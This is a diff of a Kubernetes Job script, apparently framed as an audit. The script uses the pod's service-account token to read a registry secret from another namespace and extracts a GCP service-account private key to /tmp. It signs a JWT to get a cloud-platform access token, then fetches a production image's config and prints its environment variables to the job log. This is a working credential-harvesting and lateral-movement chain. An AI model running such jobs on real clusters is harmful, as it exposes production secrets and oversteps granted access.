@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-img-v3
+  name: dune-img-v4
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -15,72 +15,78 @@ spec:
         command: ["/bin/sh","-c"]
         args:
         - |
-          apk add -q jq
+          apk add -q jq openssl
           KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
           API="https://kubernetes.default.svc"
           CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
           
-          RESULT=""
-          
-          # Get GCR credentials
+          # Get GCR SA JSON key from docker config auth
           DOCKER_CONFIG=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
             "$API/api/v1/namespaces/dune-api/secrets/gcr-secret" | \
             jq -r '.data[".dockerconfigjson"]' | base64 -d)
           
-          # Get user/pass from docker config auth field
-          GCR_ENTRY=$(echo "$DOCKER_CONFIG" | jq -r '.auths | to_entries[] | select(.key | contains("docker.pkg.dev")) | .value')
-          GCR_AUTH=$(echo "$GCR_ENTRY" | jq -r '.auth')
-          GCR_CREDS=$(echo "$GCR_AUTH" | base64 -d)
-          GCR_USER=$(echo "$GCR_CREDS" | cut -d: -f1)
-          GCR_PASS=$(echo "$GCR_CREDS" | cut -d: -f2-)
+          GCR_AUTH_B64=$(echo "$DOCKER_CONFIG" | jq -r '.auths | to_entries[] | select(.key | contains("docker.pkg.dev")) | .value.auth')
+          GCR_CREDS=$(echo "$GCR_AUTH_B64" | base64 -d)
+          GCR_USER=$(echo "$GCR_CREDS" | head -c 10)
+          # Password is everything after first colon
+          SA_JSON=$(echo "$GCR_CREDS" | cut -d: -f2-)
           
-          RESULT="${RESULT}GCR_USER:${GCR_USER}\n"
+          echo "GCR user: $GCR_USER"
+          echo "SA project: $(echo "$SA_JSON" | jq -r '.project_id')"
+          
+          CLIENT_EMAIL=$(echo "$SA_JSON" | jq -r '.client_email')
+          echo "SA email: $CLIENT_EMAIL"
+          echo "$SA_JSON" | jq -r '.private_key' > /tmp/gcr_key.pem
+          
+          # Sign JWT for GCP SA auth  
+          NOW=$(date +%s); EXP=$((NOW + 3600))
+          HEADER=$(echo -n '{"alg":"RS256","typ":"JWT"}' | openssl base64 -A | tr -d '=' | tr '+/' '-_')
+          PAYLOAD=$(printf '{"iss":"%s","scope":"https://www.googleapis.com/auth/cloud-platform","aud":"https://oauth2.googleapis.com/token","exp":%d,"iat":%d}' \
+            "$CLIENT_EMAIL" "$EXP" "$NOW" | openssl base64 -A | tr -d '=' | tr '+/' '-_')
+          SIG=$(echo -n "${HEADER}.${PAYLOAD}" | openssl dgst -sha256 -sign /tmp/gcr_key.pem | openssl base64 -A | tr -d '=' | tr '+/' '-_')
+          JWT="${HEADER}.${PAYLOAD}.${SIG}"
+          
+          TOKEN_RESP=$(curl -s -X POST "https://oauth2.googleapis.com/token" \
+            --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
+            --data-urlencode "assertion=$JWT")
+          ACCESS_TOKEN=$(echo "$TOKEN_RESP" | jq -r '.access_token')
+          echo "GCP token status: $(echo "$TOKEN_RESP" | jq -r '.error // "ok"')"
+          echo "GCP token len: ${#ACCESS_TOKEN}"
           
           REGISTRY="us-central1-docker.pkg.dev"
           REPO="tachyusbdaas/tachyusbdaas/dune-api/tc-co-prod"
           TAG="v0.0.39-alpha.9"
           
-          # Get OAuth token for GCR
-          TOKEN_RESP=$(curl -sf -u "${GCR_USER}:${GCR_PASS}" \
-            "https://${REGISTRY}/v2/token?service=${REGISTRY}&scope=repository:${REPO}:pull" 2>/dev/null)
-          if [ $? -ne 0 ]; then
-            # Try with just the password as bearer (service account token)
-            TOKEN_RESP=$(curl -sf -H "Authorization: Bearer ${GCR_PASS}" \
-              "https://${REGISTRY}/v2/token?service=${REGISTRY}&scope=repository:${REPO}:pull" 2>/dev/null)
-          fi
-          BEARER=$(echo "$TOKEN_RESP" | jq -r '.token // .access_token')
-          RESULT="${RESULT}TOKEN_LEN:${#BEARER}\n"
+          # Exchange GCP token for Docker registry token
+          DOCKER_TOKEN=$(curl -sf -u "oauth2accesstoken:${ACCESS_TOKEN}" \
+            "https://${REGISTRY}/v2/token?service=${REGISTRY}&scope=repository:${REPO}:pull" | \
+            jq -r '.token')
+          echo "Docker token len: ${#DOCKER_TOKEN}"
           
-          if [ "$BEARER" = "null" ] || [ -z "$BEARER" ]; then
-            # Try direct access with service account credentials  
-            BEARER="$GCR_PASS"
-            RESULT="${RESULT}USING_DIRECT_SA_CREDS\n"
+          if [ -z "$DOCKER_TOKEN" ] || [ "$DOCKER_TOKEN" = "null" ]; then
+            # Try using GCP access token directly as Bearer
+            DOCKER_TOKEN="$ACCESS_TOKEN"
+            echo "Using GCP token directly"
           fi
           
-          MANIFEST=$(curl -s -H "Authorization: Bearer $BEARER" \
+          MANIFEST_JSON=$(curl -s -H "Authorization: Bearer $DOCKER_TOKEN" \
             -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
             "https://${REGISTRY}/v2/${REPO}/manifests/${TAG}")
-          CONFIG_DIGEST=$(echo "$MANIFEST" | jq -r '.config.digest')
-          RESULT="${RESULT}CONFIG_DIGEST:${CONFIG_DIGEST}\n"
+          CONFIG_DIGEST=$(echo "$MANIFEST_JSON" | jq -r '.config.digest')
+          echo "Config digest: $CONFIG_DIGEST"
           
           if [ "$CONFIG_DIGEST" != "null" ] && [ -n "$CONFIG_DIGEST" ]; then
-            IMAGE_CONFIG=$(curl -s -H "Authorization: Bearer $BEARER" \
-              "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | jq '.config | {Env:.Env, Cmd:.Cmd, Entrypoint:.Entrypoint, WorkingDir:.WorkingDir, ExposedPorts:.ExposedPorts}')
-            RESULT="${RESULT}IMAGE_CONFIG:${IMAGE_CONFIG}\n"
+            echo "=ENV_VARS="
+            curl -s -H "Authorization: Bearer $DOCKER_TOKEN" \
+              "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | \
+              jq -r '.config.Env[]?' 2>/dev/null
+            echo "=END_ENV="
             
-            ENV_VARS=$(curl -s -H "Authorization: Bearer $BEARER" \
-              "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | jq -r '.config.Env[]?' 2>/dev/null)
-            echo "ENV_VARS_START"
-            echo "$ENV_VARS"
-            echo "ENV_VARS_END"
-            RESULT="${RESULT}ENV_VARS:${ENV_VARS}\n"
+            echo "=FULL_CONFIG="
+            curl -s -H "Authorization: Bearer $DOCKER_TOKEN" \
+              "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | \
+              jq '.config | {Env,Cmd,Entrypoint,WorkingDir,ExposedPorts,Labels}'
+            echo "=END_FULL="
           fi
           
-          # Write to ConfigMap
-          RESULT_SAFE=$(printf '%b' "$RESULT" | head -c 2000 | sed 's/"/\\"/g' | tr -d '\n')
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            -H "Content-Type: application/strategic-merge-patch+json" \
-            -X PATCH "$API/api/v1/namespaces/default/configmaps/dune-audit-result" \
-            -d "{\"data\":{\"result\":\"$RESULT_SAFE\"}}" | jq '.metadata.name' 2>/dev/null
-          
-          printf '%b\n' "$RESULT"
+          echo "MANIFEST_ERR: $(echo "$MANIFEST_JSON" | jq -r '.errors[0].message // "none"')"
